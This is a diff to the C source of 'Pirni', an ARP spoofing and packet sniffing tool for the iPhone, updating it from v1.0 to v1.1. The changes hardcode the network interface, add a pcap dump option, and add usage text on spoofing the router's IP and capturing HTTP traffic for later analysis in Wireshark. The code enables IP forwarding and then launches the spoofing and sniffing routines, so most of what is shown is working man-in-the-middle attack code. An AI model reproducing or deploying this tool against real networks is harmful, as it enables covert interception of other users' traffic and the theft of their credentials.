@@ -1,13 +1,17 @@
-/* Pirni ARP poisoning and packet sniffing v1.0 -- n1mda, for the iPhone
+/* Pirni ARP poisoning and packet sniffing v1.1 -- n1mda, for the iPhone
 	compile with (arm-apple-darwin9-)gcc pirni.c -o pirni -lpcap -lnet -pthread */
 	
 #include "pirni.h"
 
 void print_usage(char *name)
 {
-	printf("Pirni ARP Spoofer and packet sniffer v1.0\n\n");
-	printf("Usage:\t%s -i interface -s source_ip -b broadcast_ip -f [BPF_Filter]\n", name);
-	printf("Ex:\t%s -i en0 -s 192.168.0.1 -b 255.255.255.255 -f \"tcp dst port 80\"\n", name);
+	printf("Pirni ARP Spoofer and packet sniffer v1.1\n\n");
+	printf("Usage:\t%s -s source_ip -b broadcast_ip -f [BPF_Filter] -o log.pcap\n", name);
+	printf("Ex:\t%s -s 192.168.0.1 -b 255.255.255.255 -f \"tcp dst port 80\" -o log.pcap\n", name);
+	printf("Where:\t source_ip is the IP-adress you want to spoof, most likely the router\n");
+	printf("Where:\t broadcast_ip is the IP-adress for broadcasting packets. This changes from network to network but most common is 255.255.255.255\n");
+	printf("Where:\t [BPF_Filter] is the Berkley Packet Filter to only collect interesting packets. Read the userguide\n\n");
+	printf("You can later on transfer the dumpfile to your computer and open it with Wireshark (or any other packet analyzer that supports pcap) to analyze the traffic\n");
 	
 	return;
 }
@@ -33,13 +37,10 @@ int main(int argc, char *argv[])
 		exit(1);
 	}
 	
-	while((c = getopt(argc, argv, "di:s:b:f:o:")) != -1) {
+	while((c = getopt(argc, argv, "ds:b:f:o:")) != -1) {
 		switch(c) {
 			case 'd':
 						//arpSpoof = FALSE;
-						break;
-			case 'i':
-						device = optarg;
 						break;
 			case 's':
 						routerIP = optarg;
@@ -65,13 +66,15 @@ int main(int argc, char *argv[])
 				}
 
 
-	if(device == NULL) {
+	if(outputFile == NULL) {
 		print_usage(argv[0]);
 		exit(2);
 	}
 	if(BPFfilter == NULL) {
 		BPFfilter = "";
 	}
+	
+	device = "en0";
 	
 	printf("[+] Initializing packet forwarding: sysctl -w net.inet.ip.forwarding=1\n");
 	system("sysctl -w net.inet.ip.forwarding=1");
@@ -143,7 +146,7 @@ int main(int argc, char *argv[])
 	/* Send ARP request */
 
 	LaunchThread();
-	initSniffer(BPFfilter);
+	initSniffer(BPFfilter, outputFile);
 	
 	libnet_destroy(l);
 	return 0;
